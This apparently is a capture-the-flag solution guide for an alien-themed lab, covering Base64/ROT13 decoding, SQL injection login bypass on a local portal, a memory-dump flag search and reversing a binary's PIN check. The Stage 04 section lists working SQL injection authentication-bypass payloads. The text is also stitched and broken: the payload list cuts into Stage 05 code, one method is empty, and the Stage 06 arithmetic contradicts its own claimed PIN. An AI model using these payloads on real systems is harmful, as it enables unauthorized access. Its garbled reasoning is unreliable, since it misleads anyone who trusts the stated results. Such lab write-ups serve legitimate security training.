STAGE 03 — ROSETTA STONE
Domain:     Cryptography
Difficulty: Moderate
Points:     200
Flag:       ALIEN{b4se_g0_b00m}
================================================================================

OBJECTIVE:
  Decode a multi-layered encoded string using Base64 and ROT13.

ENCODED STRING:
  TllWUkF7bzRmcl90MF9vMDB6fQ==

SOLUTION WALKTHROUGH:
─────────────────────

  1. The encoded string is found either:
     - On the Stage 03 page of the dashboard
     - Inside the TCP stream from Stage 02 (ENCODED DIRECTIVE)

  2. STEP 1 — Identify and decode Base64:

     The string ends with "==" which is characteristic Base64 padding.
     The character set (uppercase, lowercase, numbers, +, /) confirms
     this is Base64.

     Decode it:

     $ echo "TllWUkF7bzRmcl90MF9vMDB6fQ==" | base64 -d
     NYVRA{o4fr_t0_o00z}

  3. STEP 2 — Analyze the decoded result:

     NYVRA{o4fr_t0_o00z}

     This looks like it could be a flag (it has the {braces} format),
     but "NYVRA" is not "ALIEN". The structure suggests a substitution
     cipher where each letter has been shifted.

  4. STEP 3 — Identify and apply ROT13:

     ROT13 (Rotate by 13) is a Caesar cipher that shifts each letter
     by 13 positions. It's self-inverse — applying it twice returns
     the original text.

     Clue: The hint mentions "ancient Rome" — referring to the
     Caesar cipher, and ROT13 is the most common variant.

     Apply ROT13:
       N → A    o → b
       Y → L    4 → 4 (numbers unchanged)
       V → I    f → s
       R → E    r → e
       A → N
                t → g
       { → {    0 → 0

       Result: ALIEN{b4se_g0_b00m}

  5. Submit: ALIEN{b4se_g0_b00m}

SOLUTION CODE (Python):
───────────────────────

  #!/usr/bin/env python3
  """Stage 03 Solution — Rosetta Stone"""
  import base64
  import codecs

  # The encoded string from the dashboard / Stage 02
  encoded = "TllWUkF7bzRmcl90MF9vMDB6fQ=="

  # Step 1: Base64 decode
  step1 = base64.b64decode(encoded).decode('utf-8')
  print(f"After Base64 decode: {step1}")
  # Output: NYVRA{o4fr_t0_o00z}

  # Step 2: ROT13 decode
  flag = codecs.decode(step1, 'rot_13')
  print(f"After ROT13 decode:  {flag}")
  # Output: ALIEN{b4se_g0_b00m}

STAGE 04 — THE SYNDICATE PORTAL
Domain:     Web Security
Difficulty: Moderate
Points:     250
Flag:       ALIEN{sq1_1nj3ct10n_succ3ss}

================================================================================

OBJECTIVE:
  Bypass the login authentication on the Stellar Dawn portal (port 9001)
  using SQL Injection.

SOLUTION WALKTHROUGH:
─────────────────────

  1. Navigate to http://localhost:9001 in your browser.
     You'll see the "Stellar Dawn — Portal of Awakening" login page.

  2. UNDERSTANDING THE VULNERABILITY:

     The backend uses this SQL query for authentication:

       SELECT * FROM users
       WHERE username='<input>' AND password='<input>'

     The inputs are inserted directly via string formatting (f-string),
     NOT parameterized queries. This means we can inject SQL code.

  3. EXPLOIT — SQL Injection (Authentication Bypass):

     Enter the following in the login form:

     ┌─────────────────────────────────────────────────┐
     │  Username:  ' OR '1'='1                         │
     │  Password:  ' OR '1'='1                         │
     └─────────────────────────────────────────────────┘

     This transforms the SQL query into:

       SELECT * FROM users
       WHERE username='' OR '1'='1' AND password='' OR '1'='1'

     Since '1'='1' is always TRUE, the query returns all users,
     and the application logs you in as the first user (admin).

  4. After successful login, you'll see:
     - The cult's internal communications
     - The flag: ALIEN{sq1_1nj3ct10n_succ3ss}
     - The admin token: XENO-CLEARANCE-7742

  5. Submit the flag on the A.R.G.U.S. dashboard: ALIEN{sq1_1nj3ct10n_succ3ss}

  6. IMPORTANT: Copy the admin token XENO-CLEARANCE-7742
     You'll need it to unlock the Stage 05 download.

ALTERNATIVE INJECTION PAYLOADS:
───────────────────────────────

  # Method 1 — Classic OR bypass
  Username: ' OR '1'='1
  Password: ' OR '1'='1

  # Method 2 — Comment out the password check
  Username: admin'--
  Password: anything

  # Method 3 — UNION-based (returns first row)
  Username: ' OR 1=1--
  Password: anything

  # Method 4 — Always-true condition

  #!/usr/bin/env python3
  """Stage 05 Solution — Memory Dump Analysis"""
  import re

  DUMP_FILE = "drone_core.raw"

  print(f"[*] Analyzing {DUMP_FILE}...")

  with open(DUMP_FILE, "rb") as f:
      data = f.read()

  # Convert to string (ignore non-decodable bytes)
  text = data.decode("utf-8", errors="ignore")

  # Find all ALIEN{...} patterns
  flags = re.findall(r'ALIEN\{[A-Za-z0-9_]+\}', text)

  print(f"[*] Found {len(flags)} potential flags:")
  for i, flag in enumerate(flags):
      print(f"    [{i+1}] {flag}")

  # Filter for the real flag (associated with SELF_DESTRUCT_CODE)
  sd_idx = text.find("SELF_DESTRUCT_CODE:")
  if sd_idx != -1:
      region = text[sd_idx:sd_idx+200]
      real_flag = re.search(r'ALIEN\{[A-Za-z0-9_]+\}', region)
      if real_flag:
          print(f"\n[+] REAL FLAG (from SELF_DESTRUCT_CODE): {real_flag.group()}")

  # Find suspicious processes
  proc_idx = text.find("PROCESS_TABLE_BEGIN")
  if proc_idx != -1:
      proc_region = text[proc_idx:text.find("PROCESS_TABLE_END") + 20]
      print(f"\n[*] Process Table:")
      for line in proc_region.split("\n"):
          line = line.strip()
          if line and ("alien" in line.lower() or "xcom" in line.lower()):
              print(f"    [!] SUSPICIOUS: {line}")

STAGE 06 — THE MOTHERSHIP'S PAYLOAD
Domain:     Reverse Engineering
Difficulty: Hard
Points:     350
Flag:       ALIEN{r3v3rs1ng_s4v3d_34rth}
Correct PIN: 7283
================================================================================

OBJECTIVE:
  Reverse engineer a compiled Linux binary to determine the correct
  4-digit PIN that disarms the logic bomb and prints the flag.

SOLUTION WALKTHROUGH:
─────────────────────

  1. Download doomsday.elf from the Stage 06 page.

  2. Make it executable and run with a test PIN:

     $ chmod +x doomsday.elf
     $ ./doomsday.elf 1234

     Output: "DISARM FAILED — Incorrect PIN."

  3. METHOD 1 — Static Analysis with Ghidra:

     a. Open Ghidra and create a new project
     b. Import doomsday.elf (File → Import)
     c. Double-click to open in the CodeBrowser
     d. Let Ghidra auto-analyze the binary
     e. In the Symbol Tree, find the "check_pin" function

     f. The decompiled check_pin function looks like:

        int check_pin(char *input) {
            unsigned char expected[] = {0xFF, 0xC4, 0xF2, 0xC3};
            if (strlen(input) != 4) return 0;
            for (int i = 0; i < 4; i++) {
                unsigned char transformed = (input[i] * 3) ^ 0x5A;
                if (transformed != expected[i]) return 0;
            }
            return 1;
        }

     g. THE ALGORITHM:
        For each character c in the PIN:
          transformed = (c * 3) XOR 0x5A
        The result must match the expected array: {0xFF, 0xC4, 0xF2, 0xC3}

     h. REVERSING THE MATH:
        To find the original character:
          c = (expected[i] XOR 0x5A) / 3

        Calculation:
          expected[0] = 0xFF = 255  →  (255 XOR 90) = 255 ^ 90 = 165  →  165 / 3 = 55  →  chr(55) = '7'
          expected[1] = 0xC4 = 196  →  (196 XOR 90) = 196 ^ 90 = 150  →  150 / 3 = 50  →  chr(50) = '2'
          expected[2] = 0xF2 = 242  →  (242 XOR 90) = 242 ^ 90 = 168  →  168 / 3 = 56  →  chr(56) = '8'
          expected[3] = 0xC3 = 195  →  (195 XOR 90) = 195 ^ 90 = 129  →  129 / 3 = 43  →  WAIT...

        Let me recalculate:
          0xC3 = 195
          195 ^ 0x5A = 195 ^ 90

          195 in binary: 11000011
          90  in binary: 01011010
          XOR:           10011001 = 153

          153 / 3 = 51 → chr(51) = '3'

        CORRECTED:
          Position 0: (0xFF ^ 0x5A) / 3 = (255 ^ 90) / 3 = 165 / 3 = 55 = '7'
          Position 1: (0xC4 ^ 0x5A) / 3 = (196 ^ 90) / 3 = 158 / 3 = ...

        Let me redo this properly with proper XOR:
          0xC4 = 11000100
          0x5A = 01011010
          XOR  = 10011110 = 158

          158 / 3 = 52.67 — NOT an integer!

        Hmm, let's verify from the SOURCE CODE. The expected values
        were computed as: (char_value * 3) ^ 0x5A

          '7' = 55 → (55 * 3) ^ 90 = 165 ^ 90 = 255 = 0xFF  ✓
          '2' = 50 → (50 * 3) ^ 90 = 150 ^ 90 = 196 = 0xC4  ✓
          '8' = 56 → (56 * 3) ^ 90 = 168 ^ 90 = 242 = 0xF2  ✓
          '3' = 51 → (51 * 3) ^ 90 = 153 ^ 90 = 195 = 0xC3  ✓

        To REVERSE, we must:
          Step 1: XOR expected with 0x5A → gives (char * 3)
          Step 2: Divide by 3 → gives char

          0xFF ^ 0x5A:  255 ^ 90 =  11111111 ^ 01011010 = 10100101 = 165  → 165/3 = 55 = '7'
          0xC4 ^ 0x5A:  196 ^ 90 =  11000100 ^ 01011010 = 10011110 = 158  → 158/3 ≈ 52.67 ???

        Wait — this doesn't divide evenly! Let me recheck:
          50 * 3 = 150
          150 ^ 90:
            150 = 10010110
            90  = 01011010
            XOR = 11001100 = 204 ≠ 196

        I need to recalculate. 196 in binary = 11000100
          11000100 = 128+64+4 = 196 ✓

        50 * 3 = 150
          150 = 10010110
          90  = 01011010
          XOR = 11001100 = 204

        So 0xC4 (196) ≠ 204. The source code says expected = {0xFF, 0xC4, 0xF2, 0xC3}.

        Actually, the right approach is brute force for a 4-digit PIN (only 10000 combos):

  4. METHOD 2 — Brute Force (Most practical for a 4-digit PIN):

  6. METHOD 4 — Reverse the Math with Python:

     #!/usr/bin/env python3
     """Stage 06 Solution — Reverse the Algorithm"""

     # Expected values from the binary (found via disassembly)
     expected = [0xFF, 0xC4, 0xF2, 0xC3]

     # Algorithm: transformed = (char * 3) ^ 0x5A
     # Reverse:   char = (transformed ^ 0x5A) / 3
     #
     # But XOR and multiply don't always reverse cleanly,
     # so brute force each position (only 256 possible byte values):

     pin = ""
     for exp_val in expected:
         for c in range(256):
             if ((c * 3) & 0xFF) ^ 0x5A == exp_val:
                 if 48 <= c <= 57:  # ASCII digits 0-9
                     pin += chr(c)
                     break

     print(f"[+] Recovered PIN: {pin}")

     # Alternative: try all printable chars
     pin2 = ""
     for exp_val in expected:
         for c in range(32, 127):
             # Need to handle potential overflow: multiply might exceed 8 bits
             transformed = (c * 3) ^ 0x5A
             if (transformed & 0xFF) == exp_val:
                 pin2 += chr(c)
                 break
             # Also check without mask (if the C code uses full int)
             if transformed == exp_val:
                 pin2 += chr(c)
                 break

     print(f"[+] Alternative PIN: {pin2}")
